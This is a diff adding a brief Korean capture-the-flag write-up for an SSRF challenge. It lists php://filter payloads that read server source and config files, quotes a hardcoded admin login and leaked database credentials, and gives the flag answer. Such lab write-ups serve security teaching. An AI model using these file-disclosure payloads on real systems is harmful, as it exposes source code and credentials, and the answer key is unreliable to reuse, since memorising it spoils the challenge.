@@ -1,0 +1,19 @@
+=========================================
+* SSRF 문제 4번
+=========================================
+
+1.풀이과정 
+
+php://filter/resource=admin.php
+php://filter/resource=include/common/property.php
+php://filter/resource=include/common/class.db.php
+
+if($id === "adminuser" && $pw === "adminpassword")
+//self::$instance = new db( db_host , db_user , db_pass , db_db );
+
+// op db [host: mariadb, ID:ssrf_user, PW:ssrf12#$]
+
+3. 정답
+wow_you_got_db?
+
+=========================================
